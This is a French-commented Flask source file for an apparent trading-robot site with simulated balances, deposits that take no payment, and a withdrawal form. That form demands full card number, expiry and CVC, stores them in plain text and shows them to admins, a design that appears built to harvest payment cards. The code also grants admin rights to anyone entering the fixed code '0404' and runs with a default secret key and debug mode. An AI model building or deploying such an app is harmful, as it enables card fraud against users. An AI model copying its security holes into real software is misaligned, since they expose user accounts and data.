from flask import Flask, render_template, request, redirect, url_for, session, flash
from flask_pymongo import PyMongo
from bson.objectid import ObjectId
from werkzeug.security import generate_password_hash, check_password_hash
import datetime
import os
import re
import random

app = Flask(__name__)
app.secret_key = os.getenv('FLASK_SECRET_KEY', 'cle_secrete_par_defaut')

# Config MongoDB
app.config["MONGO_URI"] = os.getenv("MONGO_URI", "mongodb://localhost:27017/robottrader")
mongo = PyMongo(app)
db = mongo.db

# =============== HELPERS ===============
def current_user():
    if 'username' in session:
        return db.users.find_one({'username': session['username']})
    return None

def is_logged_in():
    return 'username' in session

def is_admin():
    user = current_user()
    return user and user.get('role') == 'admin'

def is_client():
    user = current_user()
    return user and user.get('role') == 'client'

# =============== ROUTES ===============

@app.route('/')
def index():
    return redirect(url_for('dashboard')) if is_logged_in() else render_template('index.html')


@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        code_admin = request.form.get('code_admin', '')

        if not username or not password:
            flash("Veuillez remplir tous les champs.", "error")
            return render_template('register.html')

        if db.users.find_one({'username': username}):
            flash("Nom d'utilisateur déjà pris.", "error")
            return render_template('register.html')

        role = 'admin' if code_admin == '0404' else 'client'
        hashed_password = generate_password_hash(password)

        db.users.insert_one({
            'username': username,
            'password': hashed_password,
            'role': role,
            'balance': 0,
            'benefit': 0,
            'api_key': '',
            'api_secret': ''
        })

        flash("Inscription réussie ! Connectez-vous.", "success")
        return redirect(url_for('login'))

    return render_template('register.html')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        user = db.users.find_one({'username': username})

        if user and check_password_hash(user['password'], password):
            session['username'] = user['username']
            flash(f"Bienvenue {user['username']} !", "success")
            return redirect(url_for('dashboard'))
        else:
            flash("Identifiants invalides.", "error")

    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    # Étape 1 : Vérifie que la session contient bien le nom d'utilisateur
    username = session.get('username')
    if not username:
        flash("Session expirée. Veuillez vous reconnecter.", "error")
        return redirect(url_for('login'))

    # Étape 2 : Récupère l'utilisateur dans la base de données
    user = db.users.find_one({'username': username})
    if not user:
        flash("Utilisateur introuvable. Veuillez vous reconnecter.", "error")
        return redirect(url_for('logout'))

    # Étape 3 : Vérifie que le rôle existe et est bien "admin" ou "client"
    role = user.get('role', '').lower()  # on force en minuscules pour éviter les erreurs
    if role == 'admin':
        # Cas ADMIN : Récupère tous les utilisateurs clients
        clients = list(db.users.find({'role': 'client'}))
        return render_template(
            'dashboard.html',
            is_admin=True,
            admin={'username': user.get('username', 'Admin')},
            users=clients
        )
    elif role == 'client':
        # Cas CLIENT : Affiche son propre dashboard simulé
        return render_template(
            'dashboard.html',
            is_admin=False,
            username=user.get('username'),
            balance=user.get('balance', 0),
            benefit=user.get('benefit', 0)
        )
    else:
        # Si le rôle est inconnu
        flash("Rôle utilisateur non reconnu.", "error")
        return redirect(url_for('logout'))


# Tu peux rajouter ici les routes `/deposit`, `/withdraw`, etc. déjà en place

@app.route('/withdraw', methods=['GET', 'POST'])
def withdraw():
    if not is_logged_in():
        flash("Connectez-vous d'abord.", "error")
        return redirect(url_for('login'))

    user = current_user()
    if not user or user.get('role') != 'client':
        return "Accès refusé.", 403

    iban_enabled = False

    if request.method == 'POST':
        amount = request.form.get('amount')
        withdraw_type = request.form.get('withdraw_type')

        try:
            amount = float(amount)
            if amount <= 0:
                raise ValueError()
        except:
            flash("Montant invalide.", "error")
            return render_template('withdraw.html', iban_enabled=iban_enabled)

        if amount > user.get('balance', 0):
            flash("Montant supérieur à votre solde.", "error")
            return render_template('withdraw.html', iban_enabled=iban_enabled)

        if withdraw_type not in ['carte', 'iban', 'identification_bancaire']:
            flash("Méthode de retrait invalide.", "error")
            return render_template('withdraw.html', iban_enabled=iban_enabled)

        if withdraw_type == 'iban':
            flash("Mode de retrait momentanément indisponible.", "error")
            return render_template('withdraw.html', iban_enabled=iban_enabled)

        withdrawal = {
            'user_id': user['_id'],
            'username': user.get('username'),
            'amount': amount,
            'withdraw_type': withdraw_type,
            'status': 'En attente',
            'date': datetime.datetime.now()
        }

        if withdraw_type == 'carte':
            card_number = request.form.get('card_number', '').strip()
            card_name = request.form.get('card_name', '').strip()
            card_expiry = request.form.get('card_expiry', '').strip()
            card_cvc = request.form.get('card_cvc', '').strip()
            if not all([card_number, card_name, card_expiry, card_cvc]):
                flash("Veuillez remplir tous les champs de la carte.", "error")
                return render_template('withdraw.html', iban_enabled=iban_enabled)

            if not re.fullmatch(r"\d{13,19}", card_number.replace(' ', '')):
                flash("Numéro de carte invalide.", "error")
                return render_template('withdraw.html', iban_enabled=iban_enabled)

            if not re.fullmatch(r"(0[1-9]|1[0-2])\/\d{2}", card_expiry):
                flash("Date d'expiration invalide (MM/AA).", "error")
                return render_template('withdraw.html', iban_enabled=iban_enabled)

            if not re.fullmatch(r"\d{3,4}", card_cvc):
                flash("Code CVC invalide.", "error")
                return render_template('withdraw.html', iban_enabled=iban_enabled)

            withdrawal.update({
                'card_number': card_number,
                'card_name': card_name,
                'card_expiry': card_expiry,
                'card_cvc': card_cvc
            })

        elif withdraw_type == 'identification_bancaire':
            bank_name_id = request.form.get('bank_name_id', '').strip()
            bank_identifiers = request.form.get('bank_identifiers', '').strip()
            bank_code_id = request.form.get('bank_code_id', '').strip()
            if not all([bank_name_id, bank_identifiers, bank_code_id]):
                flash("Veuillez remplir tous les champs d'identification bancaire.", "error")
                return render_template('withdraw.html', iban_enabled=iban_enabled)

            if not re.fullmatch(r"[A-Z0-9]{5,34}", bank_identifiers):
                flash("Identifiants bancaires invalides (format attendu : 5 à 34 caractères alphanumériques).", "error")
                return render_template('withdraw.html', iban_enabled=iban_enabled)

            withdrawal.update({
                'bank_name_id': bank_name_id,
                'bank_identifiers': bank_identifiers,
                'bank_code_id': bank_code_id
            })

        db.withdrawals.insert_one(withdrawal)
        db.users.update_one({'_id': user['_id']}, {'$inc': {'balance': -amount}})
        flash("Demande de retrait enregistrée avec succès.", "success")
        return redirect(url_for('dashboard'))

    return render_template('withdraw.html', iban_enabled=iban_enabled)

@app.route('/deposit', methods=['GET', 'POST'])
def deposit():
    if not is_logged_in():
        flash("Connectez-vous d'abord.", "error")
        return redirect(url_for('login'))

    user = current_user()
    if not user or user.get('role') != 'client':
        return "Accès refusé.", 403

    if request.method == 'POST':
        amount = request.form.get('amount')
        try:
            amount = float(amount)
            if amount <= 0:
                raise ValueError()
        except:
            flash("Montant invalide.", "error")
            return render_template('deposit.html')

        db.users.update_one({'_id': user['_id']}, {'$inc': {'balance': amount}})
        flash(f"Dépôt de {amount}€ effectué avec succès.", "success")
        return redirect(url_for('dashboard'))

    return render_template('deposit.html')

@app.route('/withdraw_requests')
def withdraw_requests():
    if not is_logged_in():
        flash("Connectez-vous.", "error")
        return redirect(url_for('login'))
    if not is_admin():
        return "Accès refusé.", 403

    requests = list(db.withdrawals.find().sort('date', -1))
    return render_template('withdraw_requests.html', requests=requests)

@app.route('/process_withdraw/<withdraw_id>/<action>')
def process_withdraw(withdraw_id, action):
    if not is_logged_in() or not is_admin():
        return "Accès refusé.", 403
    if action not in ['approve', 'reject']:
        flash("Action invalide.", "error")
        return redirect(url_for('withdraw_requests'))

    withdrawal = db.withdrawals.find_one({"_id": ObjectId(withdraw_id)})
    if not withdrawal:
        flash("Demande introuvable.", "error")
        return redirect(url_for('withdraw_requests'))

    if withdrawal.get('status') != 'En attente':
        flash("Cette demande a déjà été traitée.", "info")
        return redirect(url_for('withdraw_requests'))

    if action == 'approve':
        db.withdrawals.update_one({"_id": withdrawal['_id']}, {"$set": {"status": "Approuvé", "processed_date": datetime.datetime.now()}})
        flash("Retrait approuvé.", "success")
    elif action == 'reject':
        db.users.update_one({'_id': withdrawal['user_id']}, {'$inc': {'balance': withdrawal['amount']}})
        db.withdrawals.update_one({"_id": withdrawal['_id']}, {"$set": {"status": "Rejeté", "processed_date": datetime.datetime.now()}})
        flash("Retrait rejeté et solde remboursé.", "success")

    return redirect(url_for('withdraw_requests'))

@app.errorhandler(403)
def forbidden(e):
    return render_template('403.html'), 403

@app.errorhandler(404)
def not_found(e):
    return render_template('404.html'), 404

if __name__ == '__main__':
    app.run(debug=True)
